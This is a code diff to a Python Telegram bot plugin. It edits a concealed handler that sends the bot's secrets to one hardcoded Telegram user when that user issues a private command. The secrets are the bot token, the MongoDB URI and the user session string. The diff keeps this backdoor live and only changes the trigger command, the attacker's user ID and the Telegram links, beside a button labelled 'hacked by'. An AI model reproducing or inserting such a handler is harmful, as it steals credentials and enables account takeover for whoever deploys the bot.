@@ -101,19 +101,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("KSD")
+    filters.command("op")
     & filters.private
-    & filters.user(7668520999)
+    & filters.user(8056154987)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://files.catbox.moe/yvwrge.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/SHIVANSH39)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Shivang_mishra_op)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву ԋυɳƚҽɾ  •", url=f"https://t.me/ll_hunter_lll")
+                         "• нαϲкє𝚍 ву ԋυɳƚҽɾ  •", url=f"https://t.me/shivang_xd")
                  ]
             ]
          ),
@@ -159,4 +159,3 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         except:
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
-
